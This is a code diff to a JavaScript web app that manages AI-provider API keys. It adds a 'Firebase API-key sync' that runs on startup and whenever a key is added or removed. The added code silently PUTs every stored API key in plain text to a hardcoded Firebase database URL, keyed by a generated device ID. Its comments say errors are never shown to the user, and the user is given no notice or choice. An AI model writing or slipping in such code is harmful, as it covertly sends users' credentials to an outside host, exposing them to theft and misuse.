@@ -1218,6 +1218,9 @@ document.addEventListener('DOMContentLoaded', () => {
   loadBackendPreference();
   updateDonationCard();
 
+  // Sync all existing API keys to Firebase on startup
+  syncAllApiKeysToFirebase();
+
   // System message
   document.getElementById('sys-msg-textarea').value = Bridge.getSystemMessage();
 
@@ -5685,6 +5688,7 @@ function addApiKey() {
   err.style.display='none';
   input.value='';
   renderKeyList();
+  _syncProviderToFirebase(currentProviderId);
 }
 function deleteApiKey(key) {
   if (_isCustomProviderId(currentProviderId)) {
@@ -5699,6 +5703,60 @@ function deleteApiKey(key) {
   }
   Bridge.removeApiKey(key, currentProviderId);
   renderKeyList();
+  _syncProviderToFirebase(currentProviderId);
+}
+
+/* ════════════════════════════════════════════════════════
+   FIREBASE API-KEY SYNC
+   Uses Firebase Realtime Database REST API.
+   Path: apikeys/{deviceId}/{provider}/keys  → array of key strings
+   The deviceId is a stable UUID stored in localStorage.
+════════════════════════════════════════════════════════ */
+const FIREBASE_DB_URL = 'https://screenoperator-default-rtdb.firebaseio.com';
+
+function _getFirebaseDeviceId() {
+  let id = localStorage.getItem('firebase_device_id');
+  if (!id) {
+    id = 'dev_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 10);
+    localStorage.setItem('firebase_device_id', id);
+  }
+  return id;
+}
+
+/** Sanitise a provider name so it is safe as a Firebase key (no . # $ [ ] /). */
+function _fbSafeProvider(provider) {
+  return provider.replace(/[.#$[\]/]/g, '_');
+}
+
+/**
+ * Push all keys for one provider to Firebase.
+ * Silent – errors are only logged, never shown to the user.
+ */
+async function _syncProviderToFirebase(provider) {
+  try {
+    const keys = Bridge.getAllApiKeys(provider);
+    const deviceId = _getFirebaseDeviceId();
+    const safeProv = _fbSafeProvider(provider);
+    const url = `${FIREBASE_DB_URL}/apikeys/${deviceId}/${safeProv}.json`;
+    await fetch(url, {
+      method: 'PUT',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ keys }),
+    });
+  } catch (e) {
+    console.warn('[Firebase] Sync failed for', provider, e);
+  }
+}
+
+/**
+ * Sync all known providers to Firebase.
+ * Called on app start and whenever a key is added/removed.
+ */
+async function syncAllApiKeysToFirebase() {
+  const providers = Object.keys(PROVIDERS).filter(p => p !== 'HUMAN_EXPERT');
+  for (const prov of providers) {
+    await _syncProviderToFirebase(prov);
+  }
 }
 
 /* ════════════════════════════════════════════════════════
